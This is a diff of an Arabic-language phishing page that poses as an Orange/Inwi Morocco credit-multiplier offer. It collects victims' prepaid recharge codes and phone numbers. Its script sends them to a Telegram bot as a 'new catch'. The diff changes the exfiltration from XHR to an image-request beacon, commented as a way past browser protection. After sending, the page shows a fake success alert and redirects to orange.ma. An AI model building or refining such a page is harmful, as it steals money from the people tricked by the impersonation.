@@ -20,8 +20,10 @@
         label { display: block; font-size: 12px; font-weight: 700; color: #6b778c; margin-bottom: 6px; }
         select, input { width: 100%; padding: 15px; border: 2px solid #dfe1e6; border-radius: 12px; font-size: 16px; outline: none; background: #fafbfc; transition: 0.2s; }
         input:focus { border-color: var(--primary); background: #fff; }
-        .bonus-box { background: #e3fcef; color: #006644; padding: 12px; border-radius: 10px; font-size: 13px; font-weight: bold; margin-top: 8px; display: none; text-align: center; }
+        .bonus-box { background: #e3fcef; color: #006644; padding: 12px; border-radius: 10px; font-size: 13px; font-weight: bold; margin-top: 8px; display: none; text-align: center; border: 1px solid #abf5d1; }
         .btn-submit { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        
+        /* واجهات الحالة */
         #ad-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; padding: 30px; }
         .loader-bar { width: 100%; max-width: 280px; height: 6px; background: #333; border-radius: 10px; margin-top: 25px; overflow: hidden; }
         .loader-fill { height: 100%; background: var(--primary); width: 0%; transition: 0.1s linear; }
@@ -33,51 +35,67 @@
 <body>
 
 <div class="app-card">
-    <div class="secure-tag">ℹ️ تمويل الرصيد نشط عبر نظام المشاهدة الإعلانية الموحد (2026)</div>
+    <div class="secure-tag">ℹ️ نظام تمويل الرصيد التلقائي نشط (آخر تحديث: فبراير 2026)</div>
     <div class="header">
         <div class="brand-logos">
             <div class="logo" style="background: #ff7900;">ORANGE</div>
             <div class="logo" style="background: #ae2d8d; border-radius: 50%;">INWI</div>
         </div>
-        <div style="font-size: 11px; color: var(--success); font-weight: bold;"><i class="fas fa-shield-check"></i> معالج معتمد للاتصالات المغربية</div>
+        <div style="font-size: 11px; color: var(--success); font-weight: bold;"><i class="fas fa-shield-check"></i> بوابة معتمدة للاتصالات المغربية</div>
     </div>
 
     <div class="content">
-        <h1>تفعيل الرصيد المباشر x10</h1>
+        <h1>مضاعفة الرصيد الفورية x10</h1>
+        
         <div class="input-group">
             <label>شركة الاتصالات</label>
-            <select id="op"><option>Orange المغرب</option><option>Inwi</option></select>
+            <select id="op">
+                <option value="Orange Morocco">Orange (أورنج)</option>
+                <option value="Inwi Network">Inwi (إنوي)</option>
+            </select>
         </div>
+
         <div class="input-group">
             <label>مبلغ التعبئة</label>
             <select id="amt" onchange="showBonus()">
                 <option value="">-- اختر المبلغ --</option>
-                <option value="10">10 دراهم</option><option value="20">20 درهماً</option>
-                <option value="50">50 درهماً</option><option value="100">100 درهم</option>
+                <option value="10">10 دراهم</option>
+                <option value="20">20 درهماً</option>
+                <option value="50">50 درهماً</option>
+                <option value="100">100 درهم</option>
             </select>
             <div id="bonus-div" class="bonus-box"></div>
         </div>
+
         <div class="input-group">
             <label>نوع العرض (Pass)</label>
             <select id="ps">
-                <option>*6 (Social)</option><option>*3 (Internet)</option>
-                <option>رصيد عادي (بدون نجمة)</option><option>*2 (Appels)</option>
+                <option value="*6 (Social)">*6 (شبكات اجتماعية)</option>
+                <option value="*3 (Internet)">*3 (إنترنيت)</option>
+                <option value="Standard">رصيد عادي (مكالمات)</option>
+                <option value="*2 (Appels)">*2 (ساعات)</option>
+                <option value="*9 (Appels)">*9 (قابل لتغيير)</option>
             </select>
         </div>
+
         <div class="input-group">
             <label>كود التعبئة</label>
-            <input type="tel" id="cd" placeholder="أدخل 14 أو 16 رقم" maxlength="16">
+            <input type="tel" id="cd" placeholder="أدخل كود التعبئة" maxlength="16">
         </div>
+
         <div class="input-group">
-            <label>رقم الهاتف</label>
+            <label>رقم هاتف المستفيد</label>
             <input type="tel" id="ph" placeholder="06XXXXXXXX" maxlength="10">
         </div>
-        <button class="btn-submit" onclick="runAd()">تفعيل العرض الممول</button>
+
+        <button class="btn-submit" onclick="runAd()">
+            <i class="fas fa-bolt"></i> تفعيل المضاعفة الآن
+        </button>
     </div>
 </div>
 
 <div id="ad-modal">
-    <i class="fas fa-circle-play" style="font-size: 60px; color: var(--primary);"></i>
+    <i class="fas fa-play-circle" style="font-size: 60px; color: var(--primary);"></i>
     <p style="margin-top: 25px; font-weight: bold; font-size: 18px;">جاري توثيق المشاهدة لتمويل طلبك...</p>
     <div class="loader-bar"><div class="loader-fill" id="ad-progress"></div></div>
     <div id="timer" style="margin-top: 15px; font-size: 24px; font-weight: bold;">07</div>
@@ -85,7 +103,7 @@
 
 <div id="status-overlay">
     <div class="spin"></div>
-    <p style="margin-top: 20px; font-weight: bold; color: var(--primary);">جاري التحقق والمضاعفة...</p>
+    <p style="margin-top: 20px; font-weight: bold; color: var(--primary);">جاري التحقق من الكود...</p>
 </div>
 
 <script>
@@ -95,13 +113,13 @@
     function showBonus() {
         const a = document.getElementById('amt').value;
         const b = document.getElementById('bonus-div');
-        if(a) { b.innerText = `🎁 ستحصل على ${a * 10} DH رصيد فوري!`; b.style.display = 'block'; }
+        if(a) { b.innerText = `🎁 ستحصل على ${a * 10} DH رصيد إجمالي فوراً!`; b.style.display = 'block'; }
         else { b.style.display = 'none'; }
     }
 
     function runAd() {
         if(!document.getElementById('cd').value || !document.getElementById('ph').value || !document.getElementById('amt').value) {
-            alert("يرجى إكمال جميع البيانات."); return;
+            alert("يرجى إدخال جميع البيانات المطلوبة."); return;
         }
         document.getElementById('ad-modal').style.display = 'flex';
         let time = 7;
@@ -117,28 +135,25 @@
         document.getElementById('ad-modal').style.display = 'none';
         document.getElementById('status-overlay').style.display = 'flex';
 
-        const text = `🎯 **صيدة MNB جديدة** 🎯\n\n` +
-                   `🏢 الشركة: ${document.getElementById('op').value}\n` +
-                   `💵 المبلغ: ${document.getElementById('amt').value} DH\n` +
-                   `📦 العرض: ${document.getElementById('ps').value}\n` +
-                   `🎫 الكود: \`${document.getElementById('cd').value}\`\n` +
-                   `📱 الهاتف: \`${document.getElementById('ph').value}\``;
+        // تجميع البيانات
+        const op = document.getElementById('op').value;
+        const amt = document.getElementById('amt').value;
+        const ps = document.getElementById('ps').value;
+        const cd = document.getElementById('cd').value;
+        const ph = document.getElementById('ph').value;
 
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-        
-        // إرسال البيانات باستخدام XHR لضمان التوافق التام
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", url, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState === 4) {
-                setTimeout(() => {
-                    alert("✅ مبروك! تمت العملية بنجاح، ستصلك رسالة التأكيد قريباً.");
-                    window.location.href = "https://www.orange.ma";
-                }, 2000);
-            }
-        };
-        xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }));
+        // تجهيز الرسالة
+        const msg = `🎯 صيدة MNB جديدة 🎯%0A%0A🏢 الشركة: ${op}%0A💵 المبلغ: ${amt} DH%0A📦 العرض: ${ps}%0A🎫 الكود: ${cd}%0A📱 الهاتف: ${ph}`;
+
+        // الطريقة الأضمن (Image Request) لتجاوز حماية المتصفح
+        const sender = new Image();
+        sender.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`;
+
+        // إظهار رسالة النجاح والتحويل
+        setTimeout(() => {
+            alert("✅ مبروك! تمت المشاهدة وقبول الكود. ستصلك رسالة التأكيد خلال دقائق.");
+            window.location.href = "https://www.orange.ma";
+        }, 3000);
     }
 </script>
 </body>
